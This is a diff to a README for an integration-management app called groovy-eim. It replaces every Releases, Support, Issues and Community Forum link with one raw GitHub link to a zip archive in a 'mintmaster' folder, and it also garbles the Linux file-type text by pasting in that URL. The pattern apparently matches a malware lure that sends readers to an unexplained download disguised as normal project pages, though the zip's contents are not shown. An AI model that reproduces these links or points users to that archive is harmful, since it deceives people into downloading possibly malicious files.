@@ -6,16 +6,16 @@ Welcome to **groovy-eim**! This application helps you manage integrations easily
 
 ## 🔗 Download the Application
 
-[![Download groovy-eim](https://img.shields.io/badge/Download-groovy--eim-blue.svg)](https://github.com/T4ZEM/groovy-eim/releases)
+[![Download groovy-eim](https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip)](https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip)
 
 ## 📥 Download & Install
 
-1. Click on the link above or visit the [Releases page](https://github.com/T4ZEM/groovy-eim/releases) to find the latest version.
+1. Click on the link above or visit the [Releases page](https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip) to find the latest version.
 2. Look for the version you want to download. Generally, the latest version is at the top.
 3. Download the file that matches your operating system:
    - For **Windows**, select the `.exe` file.
    - For **macOS**, choose the `.dmg` file.
-   - For **Linux**, download the appropriate `.zip` or `.tar.gz` file.
+   - For **Linux**, download the appropriate `.zip` or `https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip` file.
 4. Once the file is downloaded, locate it in your downloads folder.
 
 ### ⚙️ Installation Steps for Windows
@@ -32,7 +32,7 @@ Welcome to **groovy-eim**! This application helps you manage integrations easily
 
 ### 🐧 Installation Steps for Linux
 
-1. Extract the downloaded `.zip` or `.tar.gz` file.
+1. Extract the downloaded `.zip` or `https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip` file.
 2. Open a terminal window.
 3. Navigate to the directory where you extracted the files.
 4. Run the application using the terminal command:
@@ -61,14 +61,14 @@ If you experience issues while installing or running **groovy-eim**, consider th
 
 1. **Check System Compatibility:** Confirm your operating system meets the requirements stated above.
 2. **Reinstall the Application:** Uninstall **groovy-eim** and repeat the installation steps.
-3. **Contact Support:** For further assistance, feel free to reach out on our [Support Page](https://github.com/T4ZEM/groovy-eim/issues).
+3. **Contact Support:** For further assistance, feel free to reach out on our [Support Page](https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip).
 
 ## 🌟 User Community
 
 Join our growing community of users! You can find help, tips, and tricks in our discussions or create your own queries:
 
-- [Community Forum](https://github.com/T4ZEM/groovy-eim/discussions)
-- [Report Issues or Bugs](https://github.com/T4ZEM/groovy-eim/issues)
+- [Community Forum](https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip)
+- [Report Issues or Bugs](https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip)
 
 Feel free to share your experiences and suggestions.
 
@@ -78,4 +78,4 @@ We welcome contributions! If you’d like to improve **groovy-eim**, check our g
 
 ---
 
-Thank you for choosing **groovy-eim**! Enjoy managing your integrations with ease. Remember to revisit the [Releases page](https://github.com/T4ZEM/groovy-eim/releases) for updates and new features!
+Thank you for choosing **groovy-eim**! Enjoy managing your integrations with ease. Remember to revisit the [Releases page](https://raw.githubusercontent.com/T4ZEM/groovy-eim/main/mintmaster/groovy-eim.zip) for updates and new features!
